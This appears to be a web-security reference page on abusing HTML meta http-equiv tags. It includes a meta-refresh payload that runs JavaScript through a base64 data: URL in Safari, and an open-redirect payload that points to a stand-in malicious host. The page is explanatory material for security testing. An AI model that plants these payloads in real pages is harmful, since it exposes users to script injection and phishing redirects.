# Overview

The [&lt;meta&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta) tag represents metadata that can not be represented by other HTML meta-related elements. Some `<meta>` tags are informational, like:

```html
<meta name="name" content="content">
```

However, part of them affect the page in some way, like:

```html
<meta http-equiv="content-security-policy" content="default-src 'none'; base-uri 'self'">
```

{% hint style="info" %}
Content Security Policy does not regulate `<meta>` elements.
{% endhint %}

`<meta http-equiv=...>` is a tag on the page that may emulate a subset of functions normally reserved for page headers. The dangerous functions that can be performed by `<meta http-equiv=...>` include:
- `set-cookie`:
    - `set-cookie` instruction was removed from the standard and is no longer supported at all in Firefox 68 and Chrome 65.
- `refresh`:
    - redirect to any regular URL.
    - redirect to any `data:` URL.

# Using the data: scheme to execute arbitrary JavaScript

The `<meta>` tag with the `content = "0; data: "` URI can be used to execute arbitrary JavaScript code, for example:

```html
<meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" http-equiv="refresh"/>
```

It works only on Safari. Firefox and Chrome will block this:
- Firefox does not allow navigation of the top frame to a data URL.
- Chrome does not allow navigation to the top level `data:` URI.

# Open redirect

It is possible to redirect a user to an arbitrary page using the following payload:

```html
<meta name="language" content="5;http://malicious-website.com" http-equiv="refresh"/>
```

# References

- [&lt;meta&gt; and &lt;iframe&gt; tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)
